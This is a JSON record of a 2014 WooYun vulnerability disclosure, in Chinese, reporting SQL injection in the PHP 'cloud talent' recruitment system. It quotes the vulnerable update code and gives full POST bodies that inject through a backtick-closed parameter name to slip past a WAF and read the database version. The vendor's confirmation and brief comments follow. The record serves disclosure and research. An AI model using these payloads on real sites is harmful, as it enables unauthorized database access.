{"id": 2298, "wybug_id": "wooyun-2014-060166", "wybug_title": "云人才系统SQL注入，绕过WAF", "wybug_corp": "php云人才系统", "wybug_author": "酱油甲", "wybug_date": "2014-05-11 15:39", "wybug_open_date": "2014-08-09 15:40", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-14：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-09：\t细节向公众公开  简要描述： 云人才系统SQL注入，绕过WAF 详细说明：  云人才系统SQL注入，绕过了360的WAF~~首先需要注册一个普通用户~比如官方演示站点：\n\n然后来到http://www.hr135.com/member/index.php?M=index&C=info可以看到有某数字的WAF：\n\n于是我们发现代码如下：\nfunction info_action(){\t\tif($_POST[\"submitBtn\"]){\t\t\t$_POST=$this->post_trim($_POST);\t\t\tif($_POST[\"name\"]==\"\"){\t\t\t\t$this->obj->ACT_msg(\"index.php?C=info\",\"��������Ϊ�գ�\");\t\t\t}\t\t\tif($_POST[\"city\"]==\"\"){\t\t\t\t$this->obj->ACT_msg(\"index.php?C=info\",\"�������ڵز���Ϊ�գ�\");\t\t\t}\t\t\tif($this->config['user_idcard']==\"1\")\t\t\t{\t\t\t\tif($_POST[\"idcard\"]==\"\"){\t\t\t\t\t$this->obj->ACT_msg(\"index.php?C=info\",\"���֤���벻��Ϊ�գ�\");\t\t\t\t}\t\t\t}\t\t\tif($_POST[\"cityid\"]==\"\"){\t\t\t\t$this->obj->ACT_msg(\"index.php?C=info\",\"�־�ס�ز���Ϊ�գ�\");\t\t\t}\t\t\tif($_POST[\"address\"]==\"\"){\t\t\t\t$this->obj->ACT_msg(\"index.php?C=info\",\"��ϸ��ַ����Ϊ�գ�\");\t\t\t}\t\t\tunset($_POST[\"submitBtn\"]);\t\t\t$this->obj->delfiledir(\"../upload/tel/\".$this->uid);\t\t\t$where[\"uid\"]=$this->uid;\t\t\t$nid=$this->obj->update_once(\"resume\",$_POST,$where);\n最后update_once的时候直接把$_POST带入，然后再处理数组，而且想到如果不使用等号，就能绕过WAF，于是就使用反引号闭合来注入：火狐插件提交语句为：\nname=123123&sex=6&birthday=1988-01-01&marriage=8&height=&nationality=&weight=&province=3&city=38&three_city=400&idcard=&telphone=13989765678&telhome=&email=testtest%40testtest.com&edu=9&provinceid=9&cityid=88&three_cityid=485&exp=18&address=dsfsdfdsfsdf&submitBtn=+%B1%A3+%B4%E6&description%60%3D%28select+%40%40version%29%23=123\n也可以使用burp提交：\nname=123123&sex=6&birthday=1988-01-01&marriage=8&height=&nationality=&weight=&province=3&city=38&three_city=400&idcard=&telphone=13989765678&telhome=&email=testtest%40testtest.com&edu=9&provinceid=9&cityid=88&three_cityid=485&exp=18&address=dsfsdfdsfsdf&submitBtn=%2B%B1%A3%2B%B4%E6&description%60%3D%28select%2B%40%40version%29%23=123\n~这里就绕过了WAF限制~~   漏洞证明：  看看效果：VERSION\n\n数据库路径：\n\n数据库用户：\n\n   修复方案：  过滤   版权声明：转载请注明来源 酱油甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-05-11 15:47 厂商回复： 感谢您的提供，我们会尽快修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-12 14:54 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  关注    \n     2014-05-19 11:43 |    \t\tneal \t\t\t( 普通白帽子  |\t\t\t        Rank:219 漏洞数:23        )\t\t \n  是绕过自带的WAF吗    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}